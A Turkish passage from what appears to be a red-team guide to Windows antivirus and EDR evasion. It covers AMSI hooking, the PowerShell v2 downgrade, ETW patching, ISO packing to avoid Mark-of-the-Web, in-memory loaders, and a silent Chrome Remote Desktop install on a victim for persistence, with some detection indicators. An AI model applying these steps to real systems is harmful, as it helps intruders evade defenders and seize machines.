    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notlar
- PowerShell, WScript/CScript ve özel loader'larda çalışır (aksi durumda AMSI'yi yükleyecek her şeyde).
- Uzun komut satırı izlerini önlemek için betikleri stdin üzerinden göndermekle birlikte kullanın (`PowerShell.exe -NoProfile -NonInteractive -Command -`).
- LOLBin'ler üzerinden yürütülen loader'larda kullanıldığı görülmüştür (ör. `DllRegisterServer` çağıran `regsvr32`).

**[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** aracı da AMSI'yi atlatmak için betik oluşturur.
**[https://amsibypass.com/](https://amsibypass.com/)** aracı da rastgele kullanıcı tanımlı işlevler, değişkenler ve karakter ifadeleri kullanarak imza tespitinden kaçınan, ayrıca imza tespitini önlemek için PowerShell anahtar sözcüklerindeki karakterlerin büyük/küçük harflerini rastgele değiştiren betikler oluşturur.

**Tespit edilen imzayı kaldırma**

Mevcut işlemin belleğindeki tespit edilen AMSI imzasını kaldırmak için **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** ve **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** gibi araçlar kullanabilirsiniz. Bu araç, mevcut işlemin belleğini AMSI imzası için tarar ve ardından bu imzayı NOP talimatlarıyla üzerine yazarak bellekten etkili bir şekilde kaldırır.

**AMSI kullanan AV/EDR ürünleri**

AMSI kullanan AV/EDR ürünlerinin listesini **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** adresinde bulabilirsiniz.

**PowerShell sürüm 2'yi kullanma**
PowerShell sürüm 2'yi kullanırsanız AMSI yüklenmez; böylece betiklerinizi AMSI tarafından taranmadan çalıştırabilirsiniz. Bunu şu şekilde yapabilirsiniz:

```bash
powershell.exe -version 2
```

## PS Logging

PowerShell logging, bir sistemde çalıştırılan tüm PowerShell komutlarını kaydetmenizi sağlayan bir özelliktir. Denetim ve sorun giderme amacıyla yararlı olabilir, ancak **tespit edilmekten kaçınmak isteyen saldırganlar için bir sorun da oluşturabilir**.

PowerShell logging'i atlatmak için aşağıdaki teknikleri kullanabilirsiniz:

- **PowerShell Transcription ve Module Logging'i devre dışı bırakın**: Bu amaçla [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) gibi bir araç kullanabilirsiniz.
- **PowerShell version 2 kullanın**: PowerShell version 2 kullanırsanız AMSI yüklenmez, böylece script'lerinizi AMSI tarafından taranmadan çalıştırabilirsiniz. Şöyle yapabilirsiniz: `powershell.exe -version 2`
- **Yönetilmeyen bir PowerShell oturumu kullanın**: `powershell.exe`'yi başlatmadan PowerShell'i barındırmak için [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) kullanın (Cobalt Strike'ın `powerpick` tarafından kullanılan yaklaşım). Bu, özellikle `powershell.exe` işlemine bağlı denetimlerden kaçınmanızı sağlar; ancak AMSI'yi, Script Block Logging'i veya diğer tüm PowerShell savunmalarını kendiliğinden devre dışı bırakmaz. Kapsam, runtime'a ve host uygulamasına bağlıdır.


## Obfuscation

> [!TIP]
> Bazı obfuscation teknikleri verileri şifrelemeye dayanır. Bu, binary'nin entropisini artırarak AV ve EDR'ların onu daha kolay tespit etmesine neden olur. Bu konuda dikkatli olun ve şifrelemeyi yalnızca hassas olan veya gizlenmesi gereken belirli kod bölümlerine uygulayın.

### ConfuserEx-Protected .NET Binaries'in Deobfuscation İşlemi

ConfuserEx 2 (veya ticari fork'lar) kullanan malware'i analiz ederken, decompiler'ları ve sandbox'ları engelleyen birkaç koruma katmanıyla karşılaşmak yaygındır. Aşağıdaki iş akışı, daha sonra dnSpy veya ILSpy gibi araçlarda C#'a decompile edilebilecek, **orijinale yakın bir IL'yi güvenilir biçimde geri yükler**.<sup>[[10]](#references)</sup>

1.  Anti-tampering'i kaldırma – ConfuserEx, her *method body*'yi şifreler ve şifreyi `<Module>.cctor` statik constructor'ı içinde çözer. Ayrıca PE checksum'ını yamalar; bu nedenle yapılacak herhangi bir değişiklik binary'nin çökmesine neden olur. Şifrelenmiş metadata tablolarını bulmak, XOR key'lerini kurtarmak ve temiz bir assembly yazmak için **AntiTamperKiller** kullanın:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Çıktı, kendi unpacker'ınızı oluştururken kullanışlı olabilecek 6 anti-tamper parametresini (`key0-key3`, `nameHash`, `internKey`) içerir.

2.  Sembol / control-flow kurtarma – *temiz* dosyayı **de4dot-cex**'e (de4dot'un ConfuserEx-aware fork'u) verin.
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Bayraklar:
     • `-p crx` – ConfuserEx 2 profilini seçer
     • de4dot kontrol akışı düzleştirmesini geri alır, özgün namespace'leri, sınıfları ve değişken adlarını geri yükler ve sabit dizeleri çözer.

3.  Proxy-call temizleme – ConfuserEx, decompilation'ı daha da zorlaştırmak için doğrudan method çağrılarını hafif sarmalayıcılarla (diğer adıyla *proxy call'lar*) değiştirir. Bunları **ProxyCall-Remover** ile kaldırın:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Bu adımdan sonra opak sarmalayıcı işlevler (`Class8.smethod_10`, …) yerine `Convert.FromBase64String` veya `AES.Create()` gibi normal .NET API'leri görmelisiniz.

4.  Manuel temizleme – Ortaya çıkan binary'yi dnSpy altında çalıştırın ve *gerçek* payload'ı bulmak için büyük Base64 blob'larını veya `RijndaelManaged`/`TripleDESCryptoServiceProvider` kullanımını arayın. Malware bunu genellikle `<Module>.byte_0` içinde başlatılan TLV kodlu bir byte array olarak depolar.

Yukarıdaki zincir, kötü amaçlı örneği çalıştırmaya **gerek kalmadan** yürütme akışını geri yükler; çevrimdışı bir iş istasyonunda çalışırken kullanışlıdır.

> 🛈  ConfuserEx, örnekleri otomatik olarak önceliklendirmek için IOC olarak kullanılabilecek `ConfusedByAttribute` adlı özel bir öznitelik oluşturur.

#### Tek satırlık komut
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Bu projenin amacı, [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) ve kurcalamaya karşı koruma yoluyla artırılmış yazılım güvenliği sağlayabilen, [LLVM](http://www.llvm.org/) derleme paketinin açık kaynaklı bir fork'unu sunmaktır.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator, herhangi bir harici araç kullanmadan ve derleyiciyi değiştirmeden, derleme zamanında obfuscated kod üretmek için `C++11/14` dilinin nasıl kullanılacağını gösterir.
- [**obfy**](https://github.com/fritzone/obfy): C++ template metaprogramming framework tarafından üretilen obfuscated işlemlerden oluşan bir katman ekleyerek uygulamayı crack etmek isteyen kişinin işini biraz daha zorlaştırır.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz, .exe, .dll, .sys dahil olmak üzere çeşitli PE dosyalarını obfuscate edebilen bir x64 binary obfuscator'dır.
- [**metame**](https://github.com/a0rtega/metame): Metame, rastgele yürütülebilir dosyalar için basit bir metamorphic code motorudur.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator, ROP (return-oriented programming) kullanan ve LLVM tarafından desteklenen diller için ayrıntılı bir code obfuscation framework'üdür. ROPfuscator, normal talimatları ROP zincirlerine dönüştürerek bir programı assembly code düzeyinde obfuscate eder ve böylece normal control flow hakkındaki doğal algımızı bozar.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt, Nim ile yazılmış bir .NET PE Crypter'dır.
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor, mevcut EXE/DLL dosyalarını shellcode'a dönüştürüp yükleyebilir.

### LLVM compiler destekli, fonksiyon başına self-masking

Tüm implantı yalnızca uyku sırasında maskelemek yerine, değiştirilmiş bir LLVM X86 backend, seçili fonksiyonları etkin olmadıkları sürece XOR ile maskelenmiş halde tutabilir. Function Peekaboo PoC, adı çözülmüş ve `REG_` içeren isimleri seçer, son machine code'un etrafına position-independent giriş/çıkış stub'ları ekler ve `.text` içine paylaşılan tek bir masking handler yerleştirir; kaynak düzeyindeki imzalar ve Windows x64 calling convention değişmeden kalır.<sup>[[38]](#references)[[39]](#references)</sup>

#### Backend control-flow dönüşümü

Bu işlem, instruction selection ve optimization'dan sonra yapılmalıdır; çünkü dönüşüm **üretilen her return** talimatını kapsamalı ve x86 yerleşimini tam olarak bilmelidir. Emission öncesi bir `MachineFunctionPass`, son `MachineInstr::isReturn()` talimatını bulur, son yolun eklenen epilogue'a düşmesi için bu talimatı siler ve önceki return talimatlarını `JMP_1 handler` ile değiştirir. Her return'dan önce derleyicinin ürettiği stack/frame teardown kodunu koruyun; yalnızca return talimatının kendisini yönlendirin.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` ve `emitFunctionBodyEnd()` fonksiyon başına stub'ları, `emitEndOfAsmFile()` ise handler'ı üretir. Emission aşamaları arasında paylaşılan semboller, prologue branch'inin daha sonra gelen epilogue'u hedeflemesini sağlar; elle üretilen bir near `je` için `0F 84` ve ardından dört baytlık MC expression `target - address_after_je` yazın. Handler'a yapılan çağrılar ve atlamalar ise `MCInst` nesneleri (`CALL64pcrel32` ve `JMP_1`) olarak üretilebilir. Hiçbir değişiklik yapmadığı seçilmemiş bir fonksiyon için pass `false` döndürmelidir; PoC bu durumda yanlışlıkla `true` döndürür.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadata ve pre-CRT başlatma

PoC, `.funcmeta` içine bir XOR key ve loader tarafından yeniden konumlandırılmış bir function pointer ile runtime uzunluğunu içeren 16 baytlık kayıtlar yerleştirir. C alanı `uint32_t` olsa da handler, kayıt içindeki `+8` offset'inde bir QWORD'a erişir; böylece uzunluğu ve padding'ini tüketir ve kayıtları `0x10` adımlarla ilerletir. PE section adları yalnızca sekiz bayt olduğundan, runtime lookup `.funcmet` adını görür. Harici bir patcher, yürütülebilir bir `.stub` ekler, eski entry-point RVA'yı stub içinde saklar ve `AddressOfEntryPoint` değerini yönlendirir; PIC stub, image base'i `gs:[0x60]` → `[PEB+0x10]` üzerinden alır, PE32+ import'ları tarayarak zaten import edilmiş bir `VirtualProtect`'ı çözümler ve CRT'den önce çalışır.<sup>[[38]](#references)[[39]](#references)</sup>

Başlatma, `gs:[0xE8]` içine bir sentinel yazar ve metadata'daki her fonksiyonu çağırır. Sürekli okunabilir olan prologue, fonksiyon başlangıcını `gs:[0xF0]` içine kaydeder, sentinel'ı algılar ve henüz maskelenmemiş gövdeyi atlar. Ardından epilogue `call handler` kullanır; handler 13 register'ı (`0x68` bayt) kaydettikten sonra, `[rsp+0x68]` adresindeki return address dönüştürülmüş fonksiyonun bitişini gösterir; böylece `end - start` değeri metadata kaydına yazılabilir. Tüm gövdeler maskelendikten sonra stub, sentinel'ı temizler ve `ImageBase + original_entry_point_RVA` adresine atlar.<sup>[[38]](#references)[[39]](#references)</sup>

Normal bir çağrı sırasında prologue, gövdenin şifresini çözmek için aynı simetrik handler'ı çağırır. Son yol eklenen epilogue'a düşerken önceki her return doğrudan paylaşılan handler'a atlar. Normal epilogue da `call` yerine `jmp handler` kullanır; böylece yeniden maskeleme sonrasında handler'ın `ret` talimatı çağıranın orijinal return address'ini kullanır ve fonksiyon sonucunu `RAX` içinde korur.<sup>[[38]](#references)[[39]](#references)</sup>

#### Masking primitive ve analiz göstergeleri

Handler geçerli kaydı bulur, sabit görünür prologue'u (`bu derlemede 0x46` bayt) atlar, geri kalan bölümü `PAGE_EXECUTE_READWRITE` olarak ayarlar, düşük key baytını kullanarak bayt bayt XOR uygular ve ardından bölümü `PAGE_EXECUTE_READ` olarak ayarlar. Böylece aynı döngü, girişte şifreyi çözer ve her normal çıkışta yeniden şifreler.<sup>[[38]](#references)[[39]](#references)</sup>

Bu tasarıma işaret eden güçlü göstergeler şunlardır:<sup>[[38]](#references)[[39]](#references)</sup>

- yürütülebilir bir `.stub` içindeki entry point ve key ile yeniden konumlandırılmış `.text` pointer'larını içeren bir `.funcmet` section;
- pre-CRT PEB, import table ve section table parsing işlemlerinin ardından her metadata pointer'ı üzerinden yapılan çağrılar;
- aynı `call`/`pop` PIC prologue'ları ve tek bir handler'a yönlendirilen çok sayıda return noktası;
- `gs:[0xE8]`, `gs:[0xF0]` ve `gs:[0xF8]` adreslerine yapılan yazmaların ardından tekrarlanan `VirtualProtect` geçişleri ve image-backed yürütülebilir sayfalara yapılan bayt bazlı XOR yazmaları.

Bu, memory scanner'lardan kaçınma yöntemidir; kriptografik koruma değildir: patch'lenmiş dosya hâlâ orijinal, şifresiz gövdeyi içerir ve bir debugger, `VirtualProtect` veya XOR döngüsünde duraklayarak etkin fonksiyonu dump edebilir. Tek baytlık XOR, okunabilir metadata ve sabit `0x46` sınırı da çevrimdışı kurtarmayı kolaylaştırır.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> PoC'nin TEB slotları thread-local olsa da değiştirilmiş code page'leri process-wide'dır. Bu nedenle eşzamanlı veya özyinelemeli girişler, başka bir çağrı yürütülürken talimatları yeniden toggle edebilir; exception'lar ve nonlocal exit'ler de yeniden maskelemenin atlanmasına neden olabilir. Sağlam bir uygulama geçişleri senkronize etmeli, `lpflOldProtect` üzerinden döndürülen gerçek koruma ayarını geri yüklemeli, hard-coded stub uzunluklarından kaçınmalı, x64 stack alignment açısından hem `call` hem de `jmp` yollarını denetlemeli ve yürütülebilir baytları yeniden yazdıktan sonra `FlushInstructionCache` çağırmalıdır. Microsoft, yürütülebilir kod değiştirildiğinde instruction-cache tutarlılığından çağıranın sorumlu olduğunu açıkça belirtir.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

İnternetten bazı yürütülebilir dosyaları indirip çalıştırırken bu ekranı görmüş olabilirsiniz.

Microsoft Defender SmartScreen, son kullanıcıyı potansiyel olarak kötü amaçlı uygulamaları çalıştırmaya karşı korumayı amaçlayan bir güvenlik mekanizmasıdır.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen çoğunlukla itibara dayalı bir yaklaşımla çalışır; yani nadir indirilen uygulamalar SmartScreen'i tetikleyerek son kullanıcıyı uyarır ve dosyayı çalıştırmasını engeller (ancak More Info -> Run anyway seçilerek dosya yine de çalıştırılabilir).

**MoTW** (Mark of The Web), internetten dosya indirildiğinde, indirildiği URL ile birlikte otomatik olarak oluşturulan ve Zone.Identifier adını taşıyan bir [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>)'dir.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>İnternetten indirilen bir dosyanın Zone.Identifier ADS'sini kontrol etme.</p></figcaption></figure>

> [!TIP]
> **Güvenilir** bir signing certificate ile imzalanmış yürütülebilir dosyaların **SmartScreen'i tetiklemeyeceğini** unutmayın.

Payload'larınızın Mark of The Web almasını önlemenin çok etkili bir yolu, onları ISO gibi bir tür container içine paketlemektir. Bunun nedeni, Mark-of-the-Web'in (MOTW) **NTFS olmayan** volume'lara uygulanamamasıdır.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/), Mark-of-the-Web'den kaçınmak için payload'ları çıktı container'larına paketleyen bir araçtır.

Örnek kullanım:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

İşte PackMyPayload kullanarak payload'ları ISO dosyalarının içine paketleyip SmartScreen'i bypass etmeye yönelik bir demo: [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW), Windows'ta uygulamaların ve sistem bileşenlerinin **olayları kaydetmesini** sağlayan güçlü bir günlükleme mekanizmasıdır. Ancak güvenlik ürünleri tarafından kötü amaçlı etkinlikleri izlemek ve tespit etmek için de kullanılabilir.

AMSI'nin devre dışı bırakılmasına (bypass edilmesine) benzer şekilde, kullanıcı alanındaki bir sürecin **`EtwEventWrite`** işlevinin herhangi bir olay kaydetmeden hemen geri dönmesini sağlamak da mümkündür. Bunun için işlev bellekte yamalanarak hemen geri dönmesi sağlanır ve böylece ilgili süreçte ETW günlüklemesi etkili bir şekilde devre dışı bırakılır.

Daha fazla bilgiye **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) ve [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)** adreslerinden ulaşabilirsiniz.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

C# binary'lerini belleğe yükleme yöntemi uzun süredir biliniyor ve AV'ye yakalanmadan post-exploitation araçlarınızı çalıştırmak için hâlâ çok etkili bir yol.

Payload diske dokunmadan doğrudan belleğe yükleneceğinden, yalnızca tüm süreç için AMSI'yi yamalamamız gerekir.

Çoğu C2 framework'ü (sliver, Covenant, metasploit, CobaltStrike, Havoc vb.) C# assembly'lerini doğrudan bellekte çalıştırma olanağı sunar, ancak bunu yapmanın farklı yolları vardır:

- **Fork\&Run**

Bu yöntemde **yeni bir sacrificial process başlatılır**, post-exploitation amaçlı kötü amaçlı kodunuz bu yeni sürece enjekte edilir ve çalıştırılır; işlem tamamlandığında yeni süreç sonlandırılır. Bunun hem avantajları hem de dezavantajları vardır. Fork and run yönteminin avantajı, yürütmenin Beacon implant sürecimizin **dışında** gerçekleşmesidir. Bu, post-exploitation işleminizde bir sorun çıkarsa veya yakalanırsa implantınızın **hayatta kalma olasılığının çok daha yüksek** olduğu anlamına gelir. Dezavantajı ise **Behavioural Detections** tarafından yakalanma olasılığınızın **daha yüksek** olmasıdır.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Bu yöntemde post-exploitation amaçlı kötü amaçlı kod **kendi sürecine** enjekte edilir. Böylece yeni bir süreç oluşturup AV tarafından taranmasını önleyebilirsiniz. Ancak payload'unuzun yürütülmesi sırasında bir sorun çıkarsa, çökebileceğinden **beacon'ınızı kaybetme olasılığınız çok daha yüksektir**.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> C# Assembly yükleme hakkında daha fazla bilgi edinmek için şu makaleye [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) ve InlineExecute-Assembly BOF'a ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly)) göz atabilirsiniz.

C# Assembly'lerini **PowerShell'den** de yükleyebilirsiniz; [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) ve [S3cur3th1sSh1t'ın videosuna](https://www.youtube.com/watch?v=oe11Q-3Akuk) göz atın.

## .NET araçlarının NativeAOT WebAssembly ile yeniden paketlenmesi (WasmForge)

Normal `execute-assembly` teknikleri, tanınabilir MSIL'i korur ve sonunda bir CLR başlatır. **WasmForge** bunun yerine yürütme altyapısını değiştirir: C# projesini deneysel NativeAOT-LLVM WASI hedefine taşır, önceden WebAssembly'ye derler ve bu modülü Wazero tabanlı bir Windows PE host'una gömer. Ortaya çıkan süreç hedefteki CLR'ye, JIT'e veya `dotnet` host'una ihtiyaç duymaz; bu nedenle yalnızca managed assembly adlarına, CLR yüklemesine, AMSI'ye veya .NET ETW'ye dayanan kuralların doğrudan görünürlüğü azalır. Bu bir kaçınma/paketleme tekniğidir, ayrıcalık sınırını bypass etmez; konuk süreç orijinal aracın izinlerini ve gözlemlenebilir OS davranışını korur.<sup>[[44]](#references)[[45]](#references)</sup>

### C# projesi derleme

Önerilen derleme yolu, .NET 10 SDK'sını, NativeAOT-LLVM workload'unu, WASI SDK 24.0'ı, linker'ı ve imzalama bağımlılıklarını içeren projenin Docker ortamıdır. `.csproj` dosyası otomatik olarak algılanır; tek komutluk derleme işlemi taşıma, uyumluluk yamalama, WASM derleme, PE oluşturma ve imzalama adımlarını gerçekleştirir.<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

Sorun giderme veya oluşturulan kodu gözden geçirme için süreci `wasmforge dotnet-migrate <dir>`, `wasmforge dotnet-patch <dir>`, `dotnet publish -c Release -r wasi-wasm` ve son olarak `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>` adımlarına bölün. Derleme imajı ayrıca WASI Preview 2 bileşen kodlamasını önlemek ve gömülü çalışma zamanının beklediği yalın modülü üretmek için bir `wasm-component-ld` sarmalayıcısı kullanır.<sup>[[44]](#references)[[45]](#references)</sup>

### wasm32 C# ile x64 Win32 arasında köprü kurma

Bu, şeffaf bir yeniden derleme değildir. NativeAOT-WASI, Windows odaklı BCL özelliklerinden yoksundur veya bunları değiştirir; ayrıca wasm32 konuk kodu genellikle dört baytlık işaretçi yuvaları ayırırken x64 API'leri sekiz baytlık işaretçiler döndürebilir. WasmForge, aşağıdaki oluşturulan katmanlarla bu iki sorunu da çözer:<sup>[[44]](#references)</sup>

1. Bir kaynak yamalayıcı, AOT'ye özgü anlamsal farklılıkları düzeltir ve desteklenmeyen registry, pipes, WMI, identity, directory-service, file-version, LSA ve benzeri çağrıları `Wf*` yardımcılarına yönlendirir.
2. Bir P/Invoke tarayıcısı, `[DllImport]` çağrılarının konuk kod içinde belirtilen DLL'yi dinamik olarak yüklemek yerine bağlantılı C köprü sembollerine bağlanması için NativeAOT `DirectPInvoke` eşlemeleri oluşturur.
3. Ana makineye bağlı işaretçiler C#'ta `ulong`, C'de ise `uint64_t` kullanır. Genel bir dağıtıcı, çağrıyı ana makinenin Win32 işleyicisine iletir; `out8_mask`, üst yarıları korunması gereken gerçek sekiz baytlık çıktı yuvalarını işaretler. İşaretlenmemiş wasm32 biçimli çıktılar, x64 yazma işleminin bitişik dört baytı bozmasını önlemek için anlık görüntü/geri yükleme koruması kullanır.
4. Özel ana makine köprüleri, LSA ticket-cache erişimi, yapılandırılmış sonuçlar içeren Kerberos/BCrypt işlemleri, TCP KDC trafiği ve LDAP sorguları gibi genel syscall dağıtımına uymayan işlemleri yönetir.

Örneğin `version.dll!VerQueryValueW` için bir sarmalayıcı, dört ana makine adresi geçirir ve 2. ile 3. bitleri (`0xC`) ayarlar; çünkü değer işaretçisi ve uzunluğu sekiz baytlık çıktı yuvalarıdır. Sarmalayıcının kendisi genel kalır ve DLL adını, export adını, bağımsız değişkenleri ve maskeyi `wf_call_v2` işlevine iletir; ana makine işaretçi dönüşümünü gerçekleştirir ve yerel API'yi çağırır.<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### Sınırlamalar ve tespit pivotları

Reflection-heavy kod, dinamik assembly yükleme, keyfi native callback'ler ve WASM belleğine döndürülen karmaşık x64 yapıları yine de araç başına yamalar gerektirebilir veya doğrudan başarısız olabilir. Genel WASI Preview 2 soketleri de no-op stub'lara ulaşabilir; bu nedenle desteklenen araçlar protokole özgü host shim'leri kullanır. Özellik eşitliği olduğunu varsaymak yerine her komutu native bir build ile doğrulayın.<sup>[[44]](#references)[[45]](#references)</sup>

Bu teknik, payload'ı görünmez kılmak yerine telemetriyi başka yere kaydırır. Tespit; WASM modülü içeren veya oluşturan bir PE'ye, Wazero benzeri runtime davranışına, olağandışı host/guest bellek ayırma ve kopyalama işlemlerine, genel doğrudan Win32 dispatch'ine, imzalama ve PE kaynaklarındaki anormalliklere, ayrıca ortaya çıkan API çağrılarına ve ağ trafiğine yönelebilir. Bu nedenle CLR-load, AMSI veya .NET ETW olaylarının olmaması, bir sürecin zararsız olduğunun kanıtı sayılmamalıdır.<sup>[[44]](#references)</sup>

## Diğer Programlama Dillerini Kullanma

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) içinde önerildiği gibi, ele geçirilmiş makineye **Saldırganın Kontrolündeki SMB paylaşımında yüklü yorumlayıcı ortamına** erişim vererek diğer dillerle kötü amaçlı kod çalıştırmak mümkündür.

SMB paylaşımındaki Interpreter Binaries'e ve ortama erişim izni vererek bu dillerdeki **keyfi kodu ele geçirilmiş makinenin belleğinde** çalıştırabilirsiniz.

Repo'nun belirttiğine göre: Defender hâlâ script'leri tarıyor; ancak Go, Java, PHP vb. kullanarak **statik imzaları atlatmak için daha fazla esneklik** elde ediyoruz. Bu dillerde rastgele, obfuscation uygulanmamış reverse shell script'leriyle yapılan testler başarılı oldu.

## Statik analizden kaçınmak için WebAssembly re-hosting

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Token stomping, EDR veya AV gibi bir güvenlik ürününün access token'ını manipüle eder. Token'ın ayrıcalıklarını azaltmak, sürecin çalışmaya devam etmesini sağlarken ayrıcalıklı inceleme veya düzeltme işlemlerini gerçekleştirmesini önleyebilir.

Bunu önlemek için Windows, **harici süreçlerin** güvenlik süreçlerinin token'larına handle almasını engelleyebilir.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Güvenilir Yazılım Kullanma

### Chrome Remote Desktop

[**Bu blog yazısında**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) anlatıldığı gibi, kurbanın PC'sine Chrome Remote Desktop yükleyip ardından kontrolü ele almak ve persistence sağlamak kolaydır:<sup>[[35]](#references)</sup>
1. https://remotedesktop.google.com/ adresinden indirin, "Set up via SSH" seçeneğine tıklayın, ardından MSI dosyasını indirmek için Windows MSI dosyasına tıklayın.
2. Kurulum programını kurbanda sessizce çalıştırın (admin gerekir): `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop sayfasına geri dönün ve Next'e tıklayın. Sihirbaz sizden yetkilendirme isteyecektir; devam etmek için Authorize düğmesine tıklayın.
4. Verilen komutu gerekli düzenlemeleri yaparak çalıştırın: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (`--pin` parametresi, GUI kullanmadan PIN'i ayarlar).
 

## Gelişmiş Evasion

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

Evasion çok karmaşık bir konudur; bazen tek bir sistemdeki pek çok farklı telemetri kaynağını hesaba katmanız gerekir. Bu nedenle olgun ortamlarda tamamen tespit edilmeden kalmak neredeyse imkânsızdır.

Karşılaşacağınız her ortamın kendine özgü güçlü ve zayıf yönleri vardır.

Daha gelişmiş Evasion tekniklerine giriş yapmak için [@ATTL4S](https://twitter.com/DaniLJ94) tarafından yapılan bu konuşmayı izlemenizi şiddetle tavsiye ederim.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Bu da [@mariuszbit](https://twitter.com/mariuszbit) tarafından Evasion in Depth hakkında yapılan bir başka harika konuşma.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Eski Teknikler**

### **Defender'ın hangi bölümleri kötü amaçlı bulduğunu kontrol etme**

[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) kullanarak **ikili dosyanın parçalarını kaldırabilir**, Defender'ın **hangi parçayı kötü amaçlı bulduğunu tespit edebilir** ve bu parçayı size ayırmasını sağlayabilirsiniz.\
